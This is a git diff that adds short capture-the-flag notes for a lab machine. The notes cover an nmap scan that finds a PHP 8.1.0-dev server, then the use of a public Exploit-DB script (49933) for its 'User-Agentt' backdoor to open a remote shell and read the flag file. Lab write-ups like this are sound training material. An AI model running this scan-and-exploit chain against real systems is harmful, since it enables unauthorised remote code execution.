@@ -1,1 +1,35 @@
-Test
+nmap -sC -sV 10.10.108.155 -oN nmap-initial.txt
+
+***********************************************************************************************
+PORT   STATE SERVICE VERSION
+80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
+| http-methods: 
+|_  Supported Methods: HEAD POST OPTIONS
+|_http-title:  Admin Dashboard
+***********************************************************************************************
+
+Searching for PHP 8.1.0 exploits, found the below:
+
+PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
+https://www.exploit-db.com/exploits/49933
+
+Get the script and run it:
+
+  |   |
+  |   |
+  |   |
+\       /
+ \     /
+  \   /
+   \ /
+  
+
+python 49933.py
+
+Enter the full host url:                                                                                                                                                 
+http://10.10.108.155                                                                                                                                                    
+Interactive shell is opened on http://10.10.108.155/                                                                                                                     
+Can't acces tty; job crontol turned off.     
+
+cat /flag.txt
+
